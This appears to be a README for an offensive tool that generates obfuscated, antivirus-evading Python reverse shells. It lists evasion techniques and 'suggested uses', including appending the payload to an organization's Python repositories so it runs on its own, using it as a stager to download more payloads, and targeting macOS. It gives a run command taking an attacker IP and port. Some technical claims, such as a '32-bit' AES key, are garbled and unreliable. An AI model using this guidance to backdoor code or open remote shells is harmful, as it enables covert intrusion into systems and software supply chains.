![](https://xringarchery.files.wordpress.com/2019/07/obama-sith-lord.jpg)

# Dark Lord Obama - Undetectable Pythonic Payload Generator

Chang Tan Lister
Lister Unlimited Cybersecurity Solutions, LLC.
changtan@listerunlimited.com

![](https://xringarchery.files.wordpress.com/2019/07/a_undetectable_payload1.png)

DLO generates a Pythonic reverse shell that as of July 29th, 2019, is undetectable on VirusTotal. It combines multiple won't-to-be-disclosed techniques (undiscloseable in detail) including but not limited to:

1. "Command Segmentation"
2. "AES Encryption" with a 32-bit key and a 16-bit initialization vector
3. Base64 Encoding - It was a necessity
4. Inline Python exec() functions, C asm() functions (will be added soon), Java/Jython, Cython, Ctypes

# Dark Lord Obama Official Release Demo

*Please click this link for a demostration video of how to use*

<a href=https://encryptedarchives2.s3-us-west-1.amazonaws.com/darklordobamarelease.mp4>Demo Video</a>

# Suggested Uses

Currently you can, after you gain a foothold in organization

1. Run the payload standalone.
2. Replace the proof-of-concept code with a Metasploit python payload
3. Taint/corrupt Python repositories: Locate the Python code repositories of a organization during a pentest and then copy-paste the entire code and append it to the bottom of the python module, guarantee auto-execution of the reverse shell when the code runs
4. Use the payload as a stager to download additional payloads
5. Use the payload against MacOS (MacBooks, iMacs, etc). They natively run Python 2.7.1

Run it as ```python darklordobama.py <attacker IP> <attacker listening port>```

![](https://xringarchery.files.wordpress.com/2019/07/a_undetectable_payload2.png)

![](https://xringarchery.files.wordpress.com/2019/07/a_undetectable_payload5.png)

